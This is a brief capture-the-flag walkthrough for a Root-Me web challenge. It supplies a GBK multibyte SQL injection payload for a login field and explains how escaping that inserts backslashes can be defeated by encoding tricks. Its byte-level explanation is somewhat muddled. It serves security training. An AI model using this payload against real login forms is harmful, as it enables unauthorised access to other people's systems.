1. [Open the task](http://challenge01.root-me.org/web-serveur/ch42/)

2. Enter the following in the login field:

> admin乗' OR 1=1; -- 乗'

### Filtering functions to protect against SQL injections may not be useful against some encodings, such as GBK.
' 	-	0x27
\	-	0x5c
乗 	- 	0x815c 
乗'	- 	0x815c27 

### After processing:
Filtering functions add 0xbf (\) before 0x5c (\) and 0x27 (')
0x81**bf**5c**bf**27 = 0x81bf & 0x5cbf & **_0x27_**


3. **Capture the flag!**